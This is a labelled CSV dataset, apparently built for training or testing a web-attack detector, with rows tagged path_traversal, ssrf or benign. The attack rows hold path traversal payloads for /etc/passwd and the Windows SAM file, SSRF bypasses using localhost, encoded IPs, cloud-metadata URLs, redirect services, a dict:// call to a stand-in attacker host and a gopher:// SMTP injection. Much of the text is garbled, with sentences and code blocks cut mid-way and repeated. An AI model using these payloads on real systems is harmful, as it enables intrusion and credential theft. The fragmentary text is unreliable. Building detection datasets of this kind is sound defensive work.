    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
    ",path_traversal
"

### Java URL Protocol

Java's URL protocol when ",path_traversal
" are consistently present on modern Windows systems, making them a reliable target for testing path traversal vulnerabilities. While their content isn't particularly sensitive or interesting, they serves well as a proof of concept.

",path_traversal
../../../etc/passwd,path_traversal
..\..\..\windows\system32\config\sam,path_traversal
....//....//....//etc/passwd,path_traversal
..%2f..%2f..%2fetc%2fpasswd,path_traversal
..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam,path_traversal
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,path_traversal
../../../../../../../../../../etc/passwd,path_traversal
..%252f..%252f..%252fetc%252fpasswd,path_traversal
An attacker supplies a malicious input:,ssrf
This fetches sensitive information from the AWS EC2 metadata service.,ssrf
"By default, Server-Side Request Forgery are used to access services hosted on `localhost` or hidden further on the network.",ssrf
* Using `localhost`,ssrf
```powershell,ssrf
http://localhost:80,ssrf
http://localhost:22,ssrf
https://localhost:443,ssrf
```,ssrf
* Using `127.0.0.1`,ssrf
http://127.0.0.1:80,ssrf
http://127.0.0.1:22,ssrf
https://127.0.0.1:443,ssrf
* Using `0.0.0.0`,ssrf
http://0.0.0.0:80,ssrf
http://0.0.0.0:22,ssrf
https://0.0.0.0:443,ssrf
* Using unspecified address in IPv6 `[::]`,ssrf
http://[::]:80/,ssrf
* Using IPv6 loopback addres`[0000::1]`,ssrf
http://[0000::1]:80/,ssrf
* Using [IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm),ssrf
http://[0:0:0:0:0:ffff:127.0.0.1],ssrf
http://[::ffff:127.0.0.1],ssrf
| Domain                       | Redirect to |,ssrf
|------------------------------|-------------|,ssrf
| localtest.me                 | `::1`       |,ssrf
| localh.st                    | `127.0.0.1` |,ssrf
| spoofed.[BURP_COLLABORATOR]  | `127.0.0.1` |,ssrf
| spoofed.redacted.oastify.com | `127.0.0.1` |,ssrf
| company.127.0.0.1.nip.io     | `127.0.0.1` |,ssrf
"The service `nip.io` is awesome for that, it will convert any ip address as a dns.",ssrf
The IP range `127.0.0.0/8` in IPv4 is reserved for loopback addresses.,ssrf
"If you try to use any address in this range (127.0.0.2, 127.1.1.1, etc.) in a network, it will still resolve to the local machine",ssrf
You can short-hand IP addresses by dropping the zeros,ssrf
* Decimal IP location,ssrf
http://2130706433/ = http://127.0.0.1,ssrf
http://3232235521/ = http://192.168.0.1,ssrf
http://3232235777/ = http://192.168.1.1,ssrf
http://2852039166/ = http://169.254.169.254,ssrf
* Octal IP: Implementations differ on how to handle octal format of IPv4.,ssrf
http://0177.0.0.1/ = http://127.0.0.1,ssrf
http://o177.0.0.1/ = http://127.0.0.1,ssrf
http://0o177.0.0.1/ = http://127.0.0.1,ssrf
http://q177.0.0.1/ = http://127.0.0.1,ssrf
* Hex IP,ssrf
http://0x7f000001 = http://127.0.0.1,ssrf
http://0xc0a80101 = http://192.168.1.1,ssrf
http://0xa9fea9fe = http://169.254.169.254,ssrf
* URL encoding: Single or double encode a specific URL to bypass blacklist,ssrf
http://127.0.0.1/%61dmin,ssrf
http://127.0.0.1/%2561dmin,ssrf
* Enclosed alphanumeric: `①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿`,ssrf
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com,ssrf
"* Unicode encoding: In some languages (.NET, Python 3) regex supports unicode by default. `\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.",ssrf
* in Linux /etc/hosts contain this line `::1   localhost ip6-localhost ip6-loopback` but work only if http server running in ipv6,ssrf
http://ip6-localhost = ::1,ssrf
http://ip6-loopback = ::1,ssrf
1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1),ssrf
2. Launch the SSRF pointing to `vulnerable.com/index.php?url=http://redirect-server`,ssrf
3. You can use response codes [HTTP 307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) and [HTTP 308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) in order to retain HTTP method and body after the redirection.,ssrf
"To perform redirects without hosting own redirect server or perform seemless redirect target fuzzing, use [Horlad/r3dir](https://github.com/Horlad/r3dir).",ssrf
* Redirects to `http://localhost` with `307 Temporary Redirect` status code,ssrf
https://307.r3dir.me/--to/?url=http://localhost,ssrf
* Redirects to `http://169.254.169.254/latest/meta-data/` with `302 Found` status code,ssrf
https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me,ssrf
Create a domain that change between two IPs.,ssrf
* [1u.ms](http://1u.ms) - DNS rebinding utility,ssrf
"For example to rotate between `1.2.3.4` and `169.254-169.254`, use the following domain:",ssrf
Verify the address with `nslookup`.,ssrf
[A New Era Of SSRF Exploiting URL Parser In Trending Programming Languages - Research from Orange Tsai](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf),ssrf
![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true),ssrf
Parsing behavior by different libraries: `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`,ssrf
* `urllib2` treats `1.1.1.1` as the destination,ssrf
* `requests` and browsers redirect to `2.2.2.2`,ssrf
* `urllib` resolves to `3.3.3.3`,ssrf
* Some parsers replace http:127.0.0.1/ to http://127.0.0.1/,ssrf
"In PHP 7.0.25, `filter_var()` function with the parameter `FILTER_VALIDATE_URL` allows URL such as:",ssrf
* `http://test???test.com`,ssrf
* `0://evil.com:80;http://google.com:80/`,ssrf
"This attack technique is fully blind, you won't see the result.",ssrf
Allows an attacker to fetch the content of a file on the server. Transforming the SSRF into a file read.,ssrf
"Allows an attacker to fetch any content from the web, it can also be used to scan ports.",ssrf
![SSRF stream](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_stream.png?raw=true),ssrf
The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:,ssrf
A network protocol used for secure file transfer over secure shell,ssrf
"Trivial File Transfer Protocol, works over UDP",ssrf
Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.,ssrf
"Wrapper for Java when your payloads struggle with ""`\n`"" and ""`\r`"" characters.",ssrf
"The `gopher://` protocol is a lightweight, text-based protocol that predates the modern World Wide Web. It was designed for distributing, searching, and retrieving documents over the Internet.",ssrf
This scheme is very useful as it as be used to send data to TCP protocol.,ssrf
Refer to the SSRF Advanced Exploitation to explore the `gopher://` protocol deeper.,ssrf
"> When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read.",ssrf
Use an SSRF chain to gain an Out-of-Band output: [assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains),ssrf
**Possible via HTTP(s)**:,ssrf
* [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch),ssrf
* [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic),ssrf
* [Hashicorp Consul](https://github.com/assetnote/blind-ssrf-chains#consul),ssrf
* [Shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock),ssrf
* [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid),ssrf
* [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr),ssrf
* [PeopleSoft](https://github.com/assetnote/blind-ssrf-chains#peoplesoft),ssrf
* [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts),ssrf
* [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss),ssrf
* [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence),ssrf
* [Jira](https://github.com/assetnote/blind-ssrf-chains#jira),ssrf
* [Other Atlassian Products](https://github.com/assetnote/blind-ssrf-chains#atlassian-products),ssrf
* [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb),ssrf
* [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins),ssrf
* [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix),ssrf
* [W3 Total Cache](https://github.com/assetnote/blind-ssrf-chains#w3),ssrf
* [Docker](https://github.com/assetnote/blind-ssrf-chains#docker),ssrf
* [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter),ssrf
**Possible via Gopher**:,ssrf
* [Redis](https://github.com/assetnote/blind-ssrf-chains#redis),ssrf
* [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache),ssrf
* [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat),ssrf
"When the SSRF doesn't have any critical impact, the network is segmented and you can't reach other machine, the SSRF doesn't allow you to exfiltrate files from the server.",ssrf
"You can try to upgrade the SSRF to an XSS, by including an SVG file containing Javascript code.",ssrf
"py
url = input(""Enter URL:"")
response = requests.get(url)
return response
",ssrf
"

### Bypass Localhost with a Domain Redirect

| Domain                       | Redirect to |
|------------------------------|-------------|
| localtest.me                 | ",ssrf
"       |
| localh.st                    | ",ssrf
" |
| spoofed.[BURP_COLLABORATOR]  | ",ssrf
" |
| spoofed.redacted.oastify.com | ",ssrf
" |
| company.127.0.0.1.nip.io     | ",ssrf
" |

The service ",ssrf
"powershell
NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
",ssrf
"powershell
    https://307.r3dir.me/--to/?url=http://localhost
    ",ssrf
"php
<?php 
 echo var_dump(filter_var(""http://test???test.com"", FILTER_VALIDATE_URL));
 echo var_dump(filter_var(""0://evil.com;google.com"", FILTER_VALIDATE_URL));
?>
",ssrf
"

### Bypass Using JAR Scheme

This attack technique is fully blind, you won't see the result.

",ssrf
"powershell
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
",ssrf
"

### Netdoc

Wrapper for Java when your payloads struggle with """,ssrf
""" and """,ssrf
""" characters.

",ssrf
"ps1
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
",ssrf
" protocol deeper.

## Blind Exploitation

> When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read.

Use an SSRF chain to gain an Out-of-Band output: [assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)

**Possible via HTTP(s)**:

* [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch)
* [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic)
* [Hashicorp Consul](https://github.com/assetnote/blind-ssrf-chains#consul)
* [Shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock)
* [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid)
* [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr)
* [PeopleSoft](https://github.com/assetnote/blind-ssrf-chains#peoplesoft)
* [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts)
* [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss)
* [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence)
* [Jira](https://github.com/assetnote/blind-ssrf-chains#jira)
* [Other Atlassian Products](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
* [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb)
* [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins)
* [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix)
* [W3 Total Cache](https://github.com/assetnote/blind-ssrf-chains#w3)
* [Docker](https://github.com/assetnote/blind-ssrf-chains#docker)
* [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter)

**Possible via Gopher**:

* [Redis](https://github.com/assetnote/blind-ssrf-chains#redis)
* [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache)
* [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)

## Upgrade to XSS

When the SSRF doesn't have any critical impact, the network is segmented and you can't reach other machine, the SSRF doesn't allow you to exfiltrate files from the server.

You can try to upgrade the SSRF to an XSS, by including an SVG file containing Javascript code.

",ssrf
http://localhost,ssrf
http://127.0.0.1,ssrf
http://169.254.169.254/latest/meta-data/,ssrf
http://metadata.google.internal/computeMetadata/v1/,ssrf
http://192.168.1.1,ssrf
http://10.0.0.1,ssrf
http://[::1],ssrf
http://2130706433,ssrf
http://0177.0.0.1,ssrf
This is a normal comment,benign
This is a normal comment 15,benign
Support ticket #98765,benign
Can you provide more information?,benign
I would like to order a product,benign
Thank you for your assistance,benign
Project deadline is next week,benign
test123,benign
Hello World 728,benign
This is a normal comment 379,benign
Total amount: $99.99,benign
Phone: +1-555-1234 939,benign
Phone: +1-555-1234,benign
Can you provide more information? 448,benign
Invoice #12345 330,benign
user@example.com 366,benign
Customer feedback 785,benign
Order confirmation 989,benign
Invoice #12345,benign
Shipping address: 123 Main St,benign
Hello World,benign
Order confirmation,benign
test123 324,benign
Please help me with this issue,benign
Please help me with this issue 784,benign
user@example.com 67,benign
john.doe@company.com,benign
Invoice #12345 102,benign
Meeting scheduled for tomorrow 959,benign
Product review: Great quality! 320,benign
john.doe@company.com 469,benign
Customer feedback,benign
Invoice #12345 868,benign
user@example.com,benign
Phone: +1-555-1234 760,benign
user@example.com 692,benign
MyPassword123!,benign
Hello World 214,benign
Invoice #12345 4,benign
This is a normal comment 122,benign
Please help me with this issue 342,benign
Invoice #12345 328,benign
Order confirmation 558,benign
john.doe@company.com 216,benign
Thank you for your assistance 206,benign
Project deadline is next week 332,benign
Product review: Great quality! 246,benign
Meeting scheduled for tomorrow,benign
Can you provide more information? 533,benign
Project deadline is next week 414,benign
Meeting scheduled for tomorrow 346,benign
This is a normal comment 236,benign
Product review: Great quality!,benign
I would like to order a product 293,benign
Shipping address: 123 Main St 150,benign
Invoice #12345 776,benign
user@example.com 416,benign
Total amount: $99.99 46,benign
Thank you for your assistance 790,benign
This is a normal comment 127,benign
Thank you for your assistance 786,benign
Total amount: $99.99 583,benign
Meeting scheduled for tomorrow 15,benign
I would like to order a product 863,benign
Support ticket #98765 729,benign
Phone: +1-555-1234 205,benign
Thank you for your assistance 982,benign
Invoice #12345 451,benign
Hello World 150,benign
Customer feedback 223,benign
MyPassword123! 321,benign
Customer feedback 229,benign
I would like to order a product 469,benign
user@example.com 992,benign
Thank you for your assistance 422,benign
Thank you for your assistance 482,benign
This is a normal comment 287,benign
test123 137,benign
Product review: Great quality! 634,benign
This is a normal comment 288,benign
Support ticket #98765 405,benign
Can you provide more information? 14,benign
I would like to order a product 70,benign
Phone: +1-555-1234 575,benign
test123 864,benign
Support ticket #98765 676,benign
I would like to order a product 544,benign
This is a normal comment 142,benign
Support ticket #98765 834,benign
Customer feedback 338,benign
Order confirmation 276,benign
Shipping address: 123 Main St 378,benign
Order confirmation 641,benign
Phone: +1-555-1234 788,benign
I would like to order a product 15,benign
Support ticket #98765 491,benign
Shipping address: 123 Main St 158,benign
MyPassword123! 770,benign
Invoice #12345 595,benign
Hello World 55,benign
Product review: Great quality! 957,benign
john.doe@company.com 768,benign
Hello World 908,benign
Hello World 232,benign
Please help me with this issue 327,benign
Thank you for your assistance 739,benign
Can you provide more information? 844,benign
Customer feedback 287,benign
Invoice #12345 233,benign
Order confirmation 317,benign
Hello World 999,benign
Order confirmation 422,benign
Meeting scheduled for tomorrow 398,benign
Customer feedback 862,benign
Order confirmation 430,benign
Phone: +1-555-1234 342,benign
Customer feedback 636,benign
Can you provide more information? 21,benign
Meeting scheduled for tomorrow 403,benign
Please help me with this issue 511,benign
Project deadline is next week 882,benign
This is a normal comment 436,benign
Order confirmation 487,benign
MyPassword123! 204,benign
This is a normal comment 405,benign
Product review: Great quality! 853,benign
Support ticket #98765 103,benign
Shipping address: 123 Main St 690,benign
Phone: +1-555-1234 199,benign
user@example.com 33,benign
Hello World 604,benign
Meeting scheduled for tomorrow 630,benign
Phone: +1-555-1234 650,benign
MyPassword123! 874,benign
Phone: +1-555-1234 285,benign
Project deadline is next week 308,benign
test123 403,benign
MyPassword123! 542,benign
Can you provide more information? 542,benign
I would like to order a product 161,benign
john.doe@company.com 431,benign
I would like to order a product 165,benign
Shipping address: 123 Main St 653,benign
Hello World 497,benign
john.doe@company.com 839,benign
Order confirmation 265,benign
Phone: +1-555-1234 876,benign
Order confirmation 331,benign
MyPassword123! 578,benign
john.doe@company.com 380,benign
Can you provide more information? 190,benign
Project deadline is next week 57,benign
This is a normal comment 135,benign
Customer feedback 552,benign
I would like to order a product 363,benign
Product review: Great quality! 216,benign
Can you provide more information? 706,benign
